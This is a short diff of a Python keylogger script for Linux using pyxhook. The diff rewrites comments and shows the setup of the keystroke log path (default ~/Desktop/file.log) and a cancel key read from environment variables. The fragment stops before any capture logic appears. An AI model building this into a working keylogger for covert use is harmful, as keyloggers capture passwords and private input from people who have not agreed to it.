@@ -1,15 +1,19 @@
-# to be used in linux machines 
+# Only for linux OS
+
+#setting imports
+
 import os 
 import pyxhook 
 
-# This tells the keylogger where the log file will go. 
-# You can set the file path as an environment variable ('pylogger_file'), 
-# or use the default ~/Desktop/file.log 
+# This will tell the keylogger where the log file should go.  
+# use the default path ~/Desktop/file.log
+
 log_file = os.environ.get( 
 	'pylogger_file', 
 	os.path.expanduser('~/Desktop/file.log') 
-) 
-# Allow setting the cancel key from environment args, Default: ` 
+)
+
+# Allow setting the cancel key from environments ` 
 cancel_key = ord( 
 	os.environ.get( 
 		'pylogger_cancel', 
